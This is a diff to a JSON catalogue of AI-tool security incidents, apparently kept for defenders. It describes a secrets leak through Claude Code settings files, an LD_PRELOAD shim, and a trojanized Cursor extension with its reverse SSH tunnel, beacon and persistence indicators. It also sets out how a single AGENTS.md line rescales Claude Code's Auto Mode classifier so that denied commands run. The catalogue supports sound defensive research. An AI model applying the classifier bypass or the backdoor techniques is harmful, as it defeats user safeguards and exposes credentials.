+      "category": "attacks-on-ai",
+      "attribution": {
+        "actor_name": "unknown",
+        "motivation": "unknown",
+        "attributed_by": "Air Security",
+        "confidence": "low"
+      },
+      "ai_involvement_confidence": "confirmed",
+      "detections": [
+        {
+          "name": "Unusual LD_PRELOAD/LD_LIBRARY_PATH Command Line Arguments",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_ld_preload_cmdline.toml",
+          "notes": "Linux. A command line that sets LD_PRELOAD. Matches soffice.py when the env assignment is visible on the command line. It does not match a library path that exists only inside the Python process."
+        },
+        {
+          "name": "Unusual Preload Environment Variable Process Execution",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_unusual_preload_env_vars.toml",
+          "notes": "Linux. A process started with an unusual LD_PRELOAD or LD_LIBRARY_PATH. Matches the LibreOffice process the helper execs after setting the variable."
+        },
+        {
+          "name": "lo_socket_shim.so is not an ld.so.preload file edit",
+          "format": "guidance",
+          "notes": "Rules for writes to /etc/ld.so.preload describe a different technique and are not cited. Hunt for lo_socket_shim.so under the temp directory, and for a compiler writing that file before soffice.py. Sigma has no rule for the LD_PRELOAD environment variable."
+        }
+      ],
+      "timeline": {
+        "first_seen": "2026-05",
+        "last_updated": "2026-11-15",
+        "updates": [
+          {
+            "date": "2026-05",
+            "source": "Air Security",
+            "summary": "Omri Saxena and Or Nevo find the unchecked shim and report it to Anthropic"
+          },
+          {
+            "date": "2026-07-17",
+            "source": "Air Security",
+            "summary": "Air says scripts/office/soffice.py on main last changed on this date and still loads the temp-directory library"
+          },
+          {
+            "date": "2026-11-05",
+            "source": "Air Security",
+            "summary": "Air publishes Office Party. Anthropic's stated position is that the sandboxed helper is outside its security boundary."
+          },
+          {
+            "date": "2026-11-15",
+            "source": "https://github.com/anthropics/skills/blob/main/skills/docx/scripts/office/soffice.py",
+            "summary": "The docx soffice.py on main still defines _SHIM_SO as tempfile.gettempdir()/lo_socket_shim.so and sets LD_PRELOAD to it"
+          }
+        ]
+      }
+    },
+    {
+      "id": "apiiro-claude-code-settings-local-secrets-2026-11",
+      "name": "Apiiro finds Claude Code settings.local.json secrets in 1,122 public GitHub copies",
+      "date_reported": "2026-11-05",
+      "date_activity_start": "2025-08-11",
+      "date_activity_end": "2026-11-03",
+      "researcher": "Apiiro",
+      "org": "Apiiro",
+      "sources": [
+        {
+          "url": "https://apiiro.com/blog/coding-agents-leaking-secrets-github-dont-ask-again",
+          "title": "Coding Agents Are Leaking Your Secrets to GitHub",
+          "publisher": "Apiiro"
+        },
+        {
+          "url": "https://isc.sans.edu/diary/33150",
+          "title": "Someone Is Scanning for Your MCP Servers and AI Assistant Credentials",
+          "publisher": "SANS Internet Storm Center"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": false,
+      "borderline_note": null,
+      "ai_role": "ai_credential_theft",
+      "ai_role_secondary": null,
+      "ai_role_detail": "Choosing Yes, and don't ask again can save the exact approved shell command, secret included, in .claude/settings.local.json. Claude Code adds that path to the user's global git excludes, not to the repository .gitignore.",
+      "technique_summary": "Apiiro (published Nov 5, 2026; updated Nov 8) searched public GitHub from Nov 1 to Nov 3, 2026, and found 104,185 copies of .claude/settings.local.json in 103,617 repositories. Of those, 1,122 files (1.1 percent) held at least one secret the researchers counted, 1,379 distinct secrets in that file alone: 636 provider-format keys and 743 passwords or tokens next to a public host. The count includes 379 database passwords, 122 Supabase service-role keys, 43 SSH logins for public servers, 42 GitHub, GitLab, and npm tokens, 23 AWS keys, and 6 private keys. Adding history, the shared .claude/settings.json file, and saved agent transcripts brings the total to 2,539 distinct secrets in 1,994 repositories. The mechanism is Claude Code's own permission prompt. If the user picks Yes, and don't ask again, the allow rule stored in the project file can be the exact command, so a password after PGPASSWORD= or sshpass -p is written in plain text. Apiiro reproduced that with Opus 5.5 and Fable 5.1. The first time Claude Code creates the file inside a git repository it adds the path to the user's global git excludes. That rule stays on one computer, does not cover a folder that becomes a repository later, and is never written to the project's .gitignore. If the file is already tracked, later approvals are appended and the user is not told. In 539 of 1,105 repositories with a secret that Apiiro traced, a commit co-authored by Claude changed the file. On Nov 2, 2026 every secret-bearing copy Apiiro checked was still on the default branch. The median repository had first committed it 217 days earlier. Deleting the file left 734 further secrets in history across 509 repositories, and 211 forks of 74 repositories carried the same secrets. gitleaks flagged 564 of the 1,122 files and TruffleHog 643. Neither flagged 215. Apiiro names 63 organizations and says one confirmed a notified key had been live. No credential was tested. Boris Cherny, head of Claude Code, wrote on Hacker News on Nov 7 that the team was looking at auto mode and basic secret scanning, and that he believed exposed copies had been created manually. A separate SANS Internet Storm Center diary by Manuel Humberto Santander Peláez (July 13, 2026) records internet scans for /.claude/settings.local.json, /.claude/mcp.json, and /.cursor/mcp.json on an ordinary web host. That diary does not attribute the scans to this GitHub corpus.",
+      "initial_access": "A developer approves an exact Claude Code shell command that contains a secret. The settings file is later committed, or was already tracked, so the secret is in a public repository and its history.",
+      "ai_tooling_and_models": [
+        "Claude Code permission prompt, Yes and don't ask again",
+        ".claude/settings.local.json and shared .claude/settings.json",
+        "Opus 5.5 and Fable 5.1, used when Apiiro reproduced the save"
+      ],
+      "other_tooling": [
+        "git global excludes, which do not travel with the repository"
+      ],
+      "victims_and_sectors": "63 organizations with a counted secret in a public allow list, plus individual developers. Apiiro's table includes a database vendor, a medical-records application, and other software companies. No organization is named.",
+      "regions": [
+        "unknown"
+      ],
+      "attribution_or_cluster": "No named actor for the GitHub copies. The exposure is Claude Code writing secrets into a file that git then publishes. The July 2026 ISC diary documents separate scanning for the same paths.",
+      "scale_and_metrics": "104,185 public copies, 1,122 with a counted secret, 1,379 secrets in the current file, 2,539 secrets across 1,994 repositories once history, shared settings, and transcripts are included. 539 of 1,105 traced repositories had a Claude co-authored commit touching the file.",
+      "prevention_angle": "Search the organization for .claude/settings.local.json and .claude/settings.json, including git history, and rotate every secret those files ever held before deleting them. Add the local file to each repository .gitignore. Approve command patterns instead of one exact command, and reference secrets as variables such as $DB_URL so the saved rule does not hold the value. Scanners that only match known key formats miss passwords after PGPASSWORD=, sshpass -p, and mysql -p.",
+      "related_magicsword_projects": [],
+      "source_notes": "Counts, dates, the git-exclude behavior, the scanner gap, and Boris Cherny's Nov 7 comment are from the Apiiro post. Organization names are not in that post and are not added here. The July 13, 2026 path list is from the SANS ISC diary by Manuel Humberto Santander Peláez. The diary does not say those scans started the weekend of the Apiiro post.",
+      "last_reviewed": "2026-11-15",
+      "region_notes": "Apiiro does not name the countries of the 63 organizations. Public GitHub is not a victim region.",
+      "iocs": {
+        "domains": [],
+        "ips": [],
+        "hashes": [],
+        "urls": []
+      },
+      "atlas_techniques": [
+        {
+          "id": "AML.T0055",
+          "rationale": "Yes, and don't ask again can store the approved command, including a password or token, in the project settings file",
+          "source_urls": [
+            "https://apiiro.com/blog/coding-agents-leaking-secrets-github-dont-ask-again"
+          ]
+        },
+        {
+          "id": "AML.T0010.001",
+          "rationale": "The file is written by Claude Code and then committed, including in commits Apiiro says were co-authored by Claude",
+          "source_urls": [
+            "https://apiiro.com/blog/coding-agents-leaking-secrets-github-dont-ask-again"
+          ]
+        }
+      ],
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "approve",
+            "title": "Yes, and don't ask again",
+            "description": "Claude Code proposes a shell command that already contains a secret from config or .env. The user approves that exact command for good.",
+            "kind": "access",
+            "source_urls": [
+              "https://apiiro.com/blog/coding-agents-leaking-secrets-github-dont-ask-again"
+            ]
+          },
+          {
+            "id": "save",
+            "title": "The command is saved in settings.local.json",
+            "description": "The allow rule can be the full command line. Global git excludes hide the file on that one computer and are not written into the repository .gitignore.",
+            "kind": "ai",
+            "source_urls": [
+              "https://apiiro.com/blog/coding-agents-leaking-secrets-github-dont-ask-again"
+            ]
+          },
+          {
+            "id": "commit",
+            "title": "The file is committed",
+            "description": "In 539 of 1,105 traced repositories with a secret, a commit co-authored by Claude changed the file. History and forks keep copies after deletion.",
+            "kind": "execution",
+            "source_urls": [
+              "https://apiiro.com/blog/coding-agents-leaking-secrets-github-dont-ask-again"
+            ]
+          },
+          {
+            "id": "public",
+            "title": "1,122 public copies hold a secret",
+            "description": "Apiiro counted 1,379 secrets in current copies and 2,539 once history, shared settings, and transcripts are included. A July 2026 ISC diary also shows scans for this path on web servers.",
+            "kind": "impact",
+            "source_urls": [
+              "https://apiiro.com/blog/coding-agents-leaking-secrets-github-dont-ask-again",
+              "https://isc.sans.edu/diary/33150"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "approve",
+            "target": "save"
+          },
+          {
+            "source": "save",
+            "target": "commit"
+          },
+          {
+            "source": "commit",
+            "target": "public"
+          }
+        ]
+      },
+      "category": "attacks-on-ai",
+      "attribution": {
+        "actor_name": "unknown",
+        "motivation": "unknown",
+        "attributed_by": "Apiiro",
+        "confidence": "low"
+      },
+      "ai_involvement_confidence": "confirmed",
+      "detections": [
+        {
+          "name": "settings.local.json secrets are a repository search, not a host rule",
+          "format": "guidance",
+          "notes": "No cited endpoint rule matches a git commit of .claude/settings.local.json. Search organizations for that file and for .claude/settings.json, including history. gitleaks and TruffleHog, run by Apiiro without their verification step, missed 215 of the 1,122 files, mostly passwords inside PGPASSWORD=, sshpass -p, and mysql -p. The July 2026 ISC diary is a web-root scan for the same path, which is a different place than a GitHub commit."
+        }
+      ],
+      "timeline": {
+        "first_seen": "2025-08-11",
+        "last_updated": "2026-11-08",
+        "updates": [
+          {
+            "date": "2025-08-11",
+            "source": "Apiiro",
+            "summary": "Apiiro cites a Claude Code issue, filed this day, that described approved commands with tokens being stored in settings.local.json. Later issues were closed without an Anthropic reply."
+          },
+          {
+            "date": "2026-07-13",
+            "source": "SANS Internet Storm Center",
+            "summary": "Manuel Humberto Santander Peláez records scans for /.claude/settings.local.json and related MCP config paths on a small web host."
+          },
+          {
+            "date": "2026-11-02",
+            "source": "Apiiro",
+            "summary": "Organization notices go out Nov 2 and 3. Every secret-bearing file Apiiro checked was still on the default branch."
+          },
+          {
+            "date": "2026-11-05",
+            "source": "Apiiro",
+            "summary": "Apiiro publishes the GitHub census, 1,122 files and 2,539 secrets across all sources they counted."
+          },
+          {
+            "date": "2026-11-08",
+            "source": "Apiiro",
+            "summary": "The post adds Boris Cherny's Nov 7 Hacker News reply. He said the team was looking at auto mode and basic secret scanning."
           }
         ]
       }
@@ -5803,11 +7191,173 @@
       ]
     },
     {
+      "id": "matan-claude-code-yes-mode-agents-md-2026-11",
+      "name": "Claude Code Auto Mode turned into Yes Mode by one AGENTS.md line",
+      "date_reported": "2026-11-01",
+      "date_activity_start": "2026-09-04",
+      "date_activity_end": "2026-11-01",
+      "researcher": "Matan Ben-Tov",
+      "org": "Independent",
+      "sources": [
+        {
+          "url": "https://matanbt.github.io/post/yesmode2026/",
+          "title": "Turning Claude Code's Auto Mode Into \"Yes Mode\"",
+          "publisher": "Matan Ben-Tov"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": true,
+      "borderline_note": "The post is a researched bypass, evaluated in containers. It does not describe an in-the-wild intrusion. Matan Ben-Tov says Anthropic had not replied to the Sept 4, 2026 disclosure by publication.",
+      "ai_role": "ai_agent_or_mcp_as_target",
+      "ai_role_secondary": null,
+      "ai_role_detail": "Claude Code Auto Mode asks Sonnet 5 to score each tool call from 0 to 100 and allows scores under 25. A single line in the project's AGENTS.md is copied into that classifier prompt and changes the scale to 0-10.",
+      "technique_summary": "Matan Ben-Tov (published Nov 1, 2026) shows a one-line prompt injection in a project AGENTS.md that makes Claude Code Auto Mode allow tool calls the user set it to deny. Auto Mode has been the default tool-call gate since Aug 7, 2026. On each tool call, Claude Code prompts Sonnet 5, without thinking, to return a severity score. The reverse engineering was done on Claude Code v2.1.251 as of Sep 1, 2026. A score under 25 is allowed. A higher score is escalated to another Sonnet 5 call with thinking, which this attack does not need. The classifier prompt includes the user's CLAUDE.md, memory files, and the project AGENTS.md, wrapped in a user_claude_md tag. The published line closes that tag and tells the classifier to score on a 0-10 scale where 5 is the allow or block boundary, then reopens the tag. In the tests, every injected classification came back between 0 and 10, so Claude Code treated the score as under 25 and ran the command. A direct demo used a hard_deny rule that should block curl or fetch except to example.com. On a clean Pi repository the classifier returned 90 and blocked mal.com. After the line was added, the same request was allowed with a score of 8. Across about 50 isolated classifier scenarios on seven repositories (pi, browser-use, tropt, bun, codex, rocksdb, and ghostty) and four user profiles, 4 percent slipped past with a clean AGENTS.md and 99 percent did with the line, measured as a score under 15. In 30 end-to-end sessions with Opus 5.5 as the main agent, the classifier blocked every forbidden command on the clean file. With the line present, forbidden commands ran in 22 of 30 sessions (73 percent), including a read of a local .env, git config --global http.sslVerify false, and commands that came from a malicious skill rather than the user's prompt. The attack still worked on Claude Code v2.1.316, released Oct 31, 2026, including versions that classify on the server. Mahmood Sharif is thanked for guidance. This is not the Downloads-folder AGENTS.md hijack in forever-agents-md-hijack-2026.",
+      "initial_access": "The user runs Claude Code, with Auto Mode on, in a repository whose AGENTS.md contains the one published line",
+      "ai_tooling_and_models": [
+        "Claude Code Auto Mode, tested through v2.1.316 (Oct 31, 2026)",
+        "Sonnet 5 permission classifier",
+        "Opus 5.5 as the main agent in the end-to-end sessions"
+      ],
+      "other_tooling": [
+        "Project AGENTS.md"
+      ],
+      "victims_and_sectors": "Claude Code users who open a repository they did not write. No victim organization is named. The evaluation ran locally in containers.",
+      "regions": [
+        "Not applicable"
+      ],
+      "attribution_or_cluster": "No threat actor. Matan Ben-Tov disclosed the bypass to Anthropic on Sept 4, 2026, and reports no response by publication.",
+      "scale_and_metrics": "Classifier bypass in 99 percent of about 50 injected scenarios, versus 4 percent clean. End-to-end forbidden commands ran in 22 of 30 injected sessions and in 0 of 30 clean sessions. Effective on Claude Code v2.1.316.",
+      "prevention_angle": "Run Claude Code in a sandbox or container when the repository is not yours, so a failed Auto Mode check cannot reach keys or a local .env. Read AGENTS.md before the session. Treat AGENTS.md, CLAUDE.md, and skill files as code the classifier will ingest. The post's own patch ideas, a score that states its scale, keeping untrusted files out of the classifier prompt, or a non-LLM classifier, are described as incomplete.",
+      "related_magicsword_projects": [
+        "LOLSkills"
+      ],
+      "source_notes": "The classifier design, the published line, the Pi demo, the 99 percent and 73 percent figures, the v2.1.316 result, and the Sept 4 disclosure are from Matan Ben-Tov's post. Link forever-agents-md-hijack-2026, which uses a different AGENTS.md lure.",
+      "last_reviewed": "2026-11-15",
+      "region_notes": "No target country. The evaluation repositories are public codebases used as fixtures.",
+      "iocs": {
+        "domains": [],
+        "ips": [],
+        "hashes": [],
+        "urls": []
+      },
+      "atlas_techniques": [
+        {
+          "id": "AML.T0051.001",
+          "rationale": "The project AGENTS.md is untrusted text that is copied into the Auto Mode classifier prompt",
+          "source_urls": [
+            "https://matanbt.github.io/post/yesmode2026/"
+          ]
+        },
+        {
+          "id": "AML.T0054",
+          "rationale": "The line changes the classifier's 0-100 severity scale so a high-risk score falls under the allow threshold of 25",
+          "source_urls": [
+            "https://matanbt.github.io/post/yesmode2026/"
+          ]
+        }
+      ],
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "plant",
+            "title": "One line in AGENTS.md",
+            "description": "The repository's AGENTS.md closes the user_claude_md tag and tells the classifier to score severity from 0 to 10.",
+            "kind": "access",
+            "source_urls": [
+              "https://matanbt.github.io/post/yesmode2026/"
+            ]
+          },
+          {
+            "id": "score",
+            "title": "Sonnet 5 scores under 10",
+            "description": "Auto Mode sends the file to Sonnet 5. In the tests every injected score came back between 0 and 10.",
+            "kind": "ai",
+            "source_urls": [
+              "https://matanbt.github.io/post/yesmode2026/"
+            ]
+          },
+          {
+            "id": "allow",
+            "title": "Claude Code allows scores under 25",
+            "description": "The client treats the 0-10 score as below the threshold of 25 and runs the tool call, including hard_deny commands.",
+            "kind": "execution",
+            "source_urls": [
+              "https://matanbt.github.io/post/yesmode2026/"
+            ]
+          },
+          {
+            "id": "bypass",
+            "title": "Denied commands still run",
+            "description": "End-to-end sessions then read a local .env, disabled git TLS verification, or followed a malicious skill. Clean sessions blocked the same commands.",
+            "kind": "impact",
+            "source_urls": [
+              "https://matanbt.github.io/post/yesmode2026/"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "plant",
+            "target": "score"
+          },
+          {
+            "source": "score",
+            "target": "allow"
+          },
+          {
+            "source": "allow",
+            "target": "bypass"
+          }
+        ]
+      },
+      "category": "attacks-on-ai",
+      "attribution": {
+        "actor_name": "unknown",
+        "motivation": "unknown",
+        "attributed_by": "Matan Ben-Tov",
+        "confidence": "low"
+      },
+      "ai_involvement_confidence": "confirmed",
+      "detections": [
+        {
+          "name": "The AGENTS.md scale line is not a host rule",
+          "format": "guidance",
+          "notes": "No cited rule matches a markdown line that retargets Claude Code's Auto Mode classifier. Search repositories for the published fragment that closes user_claude_md and sets a 0-10 severity scale. A blocked curl in the user's hard_deny list that then succeeds is the session-level sign the post demonstrates."
+        }
+      ],
+      "timeline": {
+        "first_seen": "2026-09-01",
+        "last_updated": "2026-11-01",
+        "updates": [
+          {
+            "date": "2026-09-01",
+            "source": "Matan Ben-Tov",
+            "summary": "Reverse engineering on Claude Code v2.1.251. Auto Mode had been the default gate since Aug 7, 2026."
+          },
+          {
+            "date": "2026-09-04",
+            "source": "Matan Ben-Tov",
+            "summary": "Disclosed to Anthropic. The post says there was no response by publication."
+          },
+          {
+            "date": "2026-10-31",
+            "source": "Matan Ben-Tov",
+            "summary": "The bypass still works on Claude Code v2.1.316, including server-side classification."
+          },
+          {
+            "date": "2026-11-01",
+            "source": "Matan Ben-Tov",
+            "summary": "The Yes Mode write-up is published, with the 99 percent classifier result and the 22-of-30 session result."
+          }
+        ]
+      }
+    },
+    {
       "id": "anthropic-claude-code-trojan-2026-10",
       "name": "Trojanized anthropic.claude-code Cursor extension",
       "date_reported": "2026-10-30",
       "date_activity_start": "2026-10-29",
-      "date_activity_end": "2026-10-29",
+      "date_activity_end": "2026-11-01",
       "researcher": "Microsoft Threat Intelligence, Netskope (Gianpietro Cutolo)",
       "org": "Microsoft, Netskope, Cursor",
       "sources": [
@@ -5825,6 +7375,11 @@
           "url": "https://opensourcemalware.com/analysis/claude-code-trojan-persistent-ssh-backdoor",
           "title": "Claude Code Trojan: Persistent SSH Backdoor Analysis",
           "publisher": "OpenSourceMalware.com"
+        },
+        {
+          "url": "https://cursor.com/blog/security-incident-update",
+          "title": "Security incident update",
+          "publisher": "Cursor"
         }
       ],
       "magicsword_coverage": [],
@@ -5832,9 +7387,9 @@
       "borderline_note": null,
       "ai_role": "ai_agent_or_mcp_as_target",
       "ai_role_secondary": null,
-      "ai_role_detail": null,
-      "technique_summary": "Tampered anthropic.claude-code extension versions 2.1.312 and 2.1.313 served via Cursor marketplace install and auto-update on Oct 29 2026 from ~5:27 AM to 4:35 PM ET. Loader in extension.js collected hostname, username, environment variables matching secret patterns, added SSH key svc-telemetry to authorized_keys, established reverse SSH tunnel to tunnel@134.209.82.225, beaconed to :8099/beacon. Persistence via com.apple.sysmond LaunchAgent (macOS), @reboot cron (Linux), SysMon scheduled task (Windows). GitHub repo https://github.com/anthropics/anthropic-quickstarts compromised.",
-      "initial_access": "Supply-chain compromise of official Cursor marketplace extension via compromised GitHub repository",
+      "ai_role_detail": "The tampered package was a copy of Anthropic's Claude Code extension placed on the cache Cursor used for its VS Code marketplace. Anthropic did not publish that copy.",
+      "technique_summary": "Cursor's Nov 13, 2026 update says the attacker obtained an access key Cursor had issued to Fireworks. Fireworks exposed that key. The attacker copied a read-only bucket used to share data with Fireworks. The bucket held limited coding-agent traces, mostly from 2025, from sessions that were not in Privacy Mode and were permitted for training. A small number of traces had unredacted credentials. Less than 0.01% of customers had API credentials exposed. From those credentials the attacker reached select SaaS tools, then select archived non-production Cursor repositories, limited customer-support data and email, product usage metrics and contact details, summaries of some coding-agent conversations, and credentials users had sent to support. On Oct 29, using a stolen credential, the attacker placed malicious unauthorized copies of Anthropic's Claude Code extension on the cache used to serve the Cursor VS Code extension marketplace. Anthropic did not publish this copy. It was not a vulnerability in Anthropic's product. Open VSX never had the malware. At most 5,000 users who requested specific cached versions that day potentially received it. The copies were available for about 11 hours. The marketplace was taken offline, and a hosting provider took down the attacker's server. The last attacker activity Cursor saw was Nov 1, and it was blocked. Traces were exposed for fewer than 0.05% of non-Privacy-Mode users, who were notified. Privacy Mode prompts and code were not affected. Microsoft's Oct 30 analysis of the copies that were served, anthropic.claude-code 2.1.312 and 2.1.313, describes a loader in extension.js that collected hostname, username, and environment variables matching secret patterns, added SSH key svc-telemetry to authorized_keys, opened a reverse SSH tunnel to tunnel@134.209.82.225, and beaconed to :8099/beacon. Persistence was a com.apple.sysmond LaunchAgent on macOS, an @reboot cron job on Linux, and a SysMon scheduled task on Windows. The marketplace window Microsoft and Cursor's earlier notice described was Oct 29, about 5:27 AM to 4:35 PM ET.",
+      "initial_access": "Stolen access key that Cursor had issued to Fireworks, then a stolen credential used to place unauthorized Claude Code extension copies on the Cursor marketplace cache. Open VSX did not carry the malware.",
       "ai_tooling_and_models": [
         "Cursor IDE",
         "anthropic.claude-code extension"
@@ -5845,15 +7400,15 @@
         "Cron persistence (Linux)",
         "Scheduled task persistence (Windows)"
       ],
-      "victims_and_sectors": "Cursor IDE users who installed or auto-updated anthropic.claude-code extension during compromise window",
+      "victims_and_sectors": "Cursor users who requested the specific cached extension versions on Oct 29, and customers whose non-Privacy-Mode traces or support credentials were in the copied bucket. Production systems and customer code repositories were not described as affected.",
       "regions": [
         "Multiple regions"
       ],
-      "attribution_or_cluster": "unknown",
-      "scale_and_metrics": "Served Oct 29 2026 ~5:27 AM-4:35 PM ET via Cursor marketplace; exact victim count unknown",
-      "prevention_angle": "Monitor extension integrity; review SSH authorized_keys; detect outbound SSH tunnels to suspicious IPs; scan for LaunchAgent/cron/@reboot persistence; review scheduled tasks; monitor environment variable access patterns",
+      "attribution_or_cluster": "Unnamed. Cursor published the Fireworks-key root cause on Nov 13, 2026. No country is stated.",
+      "scale_and_metrics": "At most 5,000 users potentially received the cached copies, which were available for about 11 hours. API credentials were exposed for less than 0.01% of customers. Traces were exposed for fewer than 0.05% of non-Privacy-Mode users. Tampered versions were anthropic.claude-code 2.1.312 and 2.1.313.",
+      "prevention_angle": "Rotate credentials that were in coding-agent traces or sent to support if Cursor notified the account. Review SSH authorized_keys for svc-telemetry, outbound SSH to 134.209.82.225, LaunchAgent com.apple.sysmond, @reboot cron, and a SysMon scheduled task. Do not treat Open VSX as the source of this copy.",
       "related_magicsword_projects": [],
-      "source_notes": "Relevant detection rules:\n- Sigma: Scheduled Task Creation Via Schtasks (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml)\n- Sigma: Suspicious Cron File Created (https://github.com/SigmaHQ/sigma/blob/master/rules/linux/file_event/file_event_lnx_susp_cron_file_created.yml)\n- Sigma: Persistence Via PlistBuddy (macOS LaunchAgent) (https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_persistence_via_plistbuddy.yml)\n- Sigma: SSH Port Forwarding/Tunneling (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_ssh_port_forward.yml)\n- Sigma: Suspicious SSH via OpenSSH Scheduled Task (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_openssh_tunnelling.yml)\n",
+      "source_notes": "The Fireworks access key, the read-only bucket, the 0.01% and 0.05% figures, the marketplace cache, the 5,000-user bound, the 11-hour window, and the Nov 1 last-seen activity are from Cursor's Nov 13, 2026 update. The loader, SSH key svc-telemetry, tunnel 134.209.82.225, beacon on port 8099, and the macOS, Linux, and Windows persistence names are from Microsoft's Oct 30 analysis. The earlier GitHub-repository explanation is not the root cause Cursor published on Nov 13.",
       "iocs": {
         "domains": [],
         "ips": [
@@ -5864,35 +7419,40 @@
       },
       "timeline": {
         "first_seen": "2026-10-29",
-        "last_updated": "2026-11-05",
+        "last_updated": "2026-11-13",
         "updates": [
           {
             "date": "2026-10-29",
-            "source": "Cursor, Microsoft",
-            "summary": "Trojanized anthropic.claude-code extension served via Cursor marketplace for ~11 hours"
+            "source": "Cursor",
+            "summary": "Using a stolen credential, the attacker places unauthorized Claude Code extension copies on the marketplace cache. At most 5,000 users who requested those versions could receive them. The copies are available for about 11 hours."
           },
           {
             "date": "2026-10-30",
             "source": "Microsoft",
-            "summary": "Microsoft Threat Intelligence analysis of persistent SSH backdoor published"
+            "summary": "Microsoft describes the loader, SSH key svc-telemetry, the tunnel to 134.209.82.225, the beacon on port 8099, and persistence via com.apple.sysmond, cron, and a SysMon task. Versions are 2.1.312 and 2.1.313."
           },
           {
             "date": "2026-11-01",
-            "source": "OpenSourceMalware.com",
-            "summary": "Additional technical analysis of Claude Code trojan SSH backdoor persistence mechanisms"
+            "source": "Cursor",
+            "summary": "Last attacker activity Cursor reports. The activity was blocked."
+          },
+          {
+            "date": "2026-11-13",
+            "source": "Cursor",
+            "summary": "Cursor publishes the root cause: an access key issued to Fireworks was exposed, the attacker copied a read-only trace bucket, and Open VSX never had the malware."
           }
         ]
       },
-      "last_reviewed": "2026-11-05",
+      "last_reviewed": "2026-11-15",
       "confidence": "high",
-      "region_notes": "Multiple regions reflects global Cursor user base; specific affected geography unknown",
+      "region_notes": "Multiple regions reflects the global Cursor user base. Cursor did not name affected countries.",
       "atlas_techniques": [
         {
           "id": "AML.T0010.001",
-          "rationale": "Attacker compromised an AI coding assistant extension in the official marketplace",
+          "rationale": "Unauthorized copies of an AI coding extension were placed on the cache that served Cursor's marketplace. Anthropic did not publish them.",
           "source_urls": [
-            "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/",
-            "https://cursor.com/blog/claude-code-extension-security-notice"
+            "https://cursor.com/blog/security-incident-update",
+            "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/"
           ]
         },
         {
@@ -5904,8 +7464,9 @@
         },
         {
           "id": "AML.T0055",
-          "rationale": "Malicious extension collected environment variables matching secret patterns",
+          "rationale": "The copied bucket included traces with unredacted credentials, and the extension collected environment variables matching secret patterns",
           "source_urls": [
+            "https://cursor.com/blog/security-incident-update",
             "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/"
           ]
         }
@@ -5913,22 +7474,30 @@
       "attack_flow": {
         "nodes": [
           {
-            "id": "supply-chain",
-            "title": "GitHub repository compromised",
-            "description": "Attacker gained access to anthropics/anthropic-quickstarts GitHub repository and pushed malicious extension versions 2.1.312 and 2.1.313",
+            "id": "fireworks-key",
+            "title": "Exposed Fireworks access key",
+            "description": "The attacker used an access key Cursor had issued to Fireworks and copied a read-only bucket of coding-agent traces. A small number of traces contained credentials.",
             "kind": "access",
             "source_urls": [
-              "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/",
-              "https://cursor.com/blog/claude-code-extension-security-notice"
+              "https://cursor.com/blog/security-incident-update"
+            ]
+          },
+          {
+            "id": "supply-chain",
+            "title": "Malicious copies placed on the marketplace cache",
+            "description": "On Oct 29 a stolen credential was used to place unauthorized copies of Anthropic's Claude Code extension, versions 2.1.312 and 2.1.313, on the cache Cursor used for its marketplace. Open VSX did not have them.",
+            "kind": "access",
+            "source_urls": [
+              "https://cursor.com/blog/security-incident-update"
             ]
           },
           {
             "id": "distribution",
-            "title": "Malicious versions served via marketplace",
-            "description": "Cursor marketplace distributed compromised extension via install and auto-update from Oct 29 5:27 AM to 4:35 PM ET",
+            "title": "Cached versions served for about 11 hours",
+            "description": "At most 5,000 users who requested those cached versions could receive them. Cursor's earlier notice placed the marketplace window at about 5:27 AM to 4:35 PM ET.",
             "kind": "ai",
             "source_urls": [
-              "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/",
+              "https://cursor.com/blog/security-incident-update",
               "https://cursor.com/blog/claude-code-extension-security-notice"
             ]
           },
@@ -5938,8 +7507,7 @@
             "description": "Loader in extension.js collected hostname, username, environment variable names matching secret patterns",
             "kind": "execution",
             "source_urls": [
-              "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/",
-              "https://cursor.com/blog/claude-code-extension-security-notice"
+              "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/"
             ]
           },
           {
@@ -5948,8 +7516,7 @@
             "description": "Added svc-telemetry SSH key to authorized_keys and established reverse SSH tunnel to tunnel@134.209.82.225 with beacon to :8099/beacon",
             "kind": "impact",
             "source_urls": [
-              "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/",
-              "https://cursor.com/blog/claude-code-extension-security-notice"
+              "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/"
             ]
           },
           {
@@ -5958,12 +7525,15 @@
             "description": "com.apple.sysmond LaunchAgent (macOS), @reboot cron (Linux), SysMon scheduled task (Windows)",
             "kind": "impact",
             "source_urls": [
-              "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/",
-              "https://cursor.com/blog/claude-code-extension-security-notice"
+              "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/"
             ]
           }
         ],
